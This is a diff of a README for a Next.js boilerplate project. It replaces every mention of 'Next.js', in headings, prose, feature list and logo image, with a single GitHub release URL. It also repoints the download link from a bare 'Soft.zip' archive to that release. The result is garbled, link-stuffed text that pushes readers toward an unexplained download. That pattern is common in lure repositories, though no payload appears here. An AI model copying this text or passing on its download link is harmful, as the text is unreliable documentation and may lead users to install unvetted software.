@@ -1,10 +1,10 @@
-# Next.js Awesome Boilerplate 🚀
+# https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 Awesome Boilerplate 🚀
 
-Welcome to the Next.js Awesome Boilerplate GitHub repository! This boilerplate is designed to kickstart your Next.js projects with all the essential tools and configurations you need. Whether you are a beginner or an experienced developer, this boilerplate will save you time and effort in setting up your Next.js applications.
+Welcome to the https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 Awesome Boilerplate GitHub repository! This boilerplate is designed to kickstart your https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 projects with all the essential tools and configurations you need. Whether you are a beginner or an experienced developer, this boilerplate will save you time and effort in setting up your https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 applications.
 
 ## Features 🌟
 
-- **Docker**: Containerize your Next.js application for easy deployment.
+- **Docker**: Containerize your https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 application for easy deployment.
 - **ESLint**: Lint your code to maintain code quality and consistency.
 - **Lefthook**: Use Git hooks to automate tasks and ensure code quality.
 - **PNPM**: Manage your project dependencies efficiently with PNPM.
@@ -15,7 +15,7 @@ Welcome to the Next.js Awesome Boilerplate GitHub repository! This boilerplate i
 
 ## Repository Link 📦
 
-[Download the Next.js Boilerplate](https://github.com/files/Soft.zip)
+[Download the https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 Boilerplate](https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2)
 
 ## How to Use 📝
 
@@ -24,7 +24,7 @@ Welcome to the Next.js Awesome Boilerplate GitHub repository! This boilerplate i
 3. Navigate to the project directory in your terminal.
 4. Run `pnpm install` to install the project dependencies.
 5. Start the development server with `pnpm dev`.
-6. Begin building your Next.js application!
+6. Begin building your https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 application!
 
 ## Repository Topics 🔍
 
@@ -43,12 +43,12 @@ If you encounter any issues or need further guidance, feel free to check the "Re
 
 ## Get Started 🚀
 
-Now that you have all the necessary tools at your disposal, dive into the exciting world of Next.js development with this awesome boilerplate! Whether you are building a personal project, a startup MVP, or a full-fledged application, this boilerplate has got you covered.
+Now that you have all the necessary tools at your disposal, dive into the exciting world of https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 development with this awesome boilerplate! Whether you are building a personal project, a startup MVP, or a full-fledged application, this boilerplate has got you covered.
 
-Let your creativity flow and leverage the power of Next.js combined with modern tools and best practices to create exceptional web experiences. Happy coding!
+Let your creativity flow and leverage the power of https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 combined with modern tools and best practices to create exceptional web experiences. Happy coding!
 
 ### Happy Coding! 🎉
 
-![Next.js Logo](https://cdn.worldvectorlogo.com/logos/next-js.svg)
+![https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2 Logo](https://github.com/CodeurPirate/nextjs-boilerplate/releases/tag/v1.2)
 
 
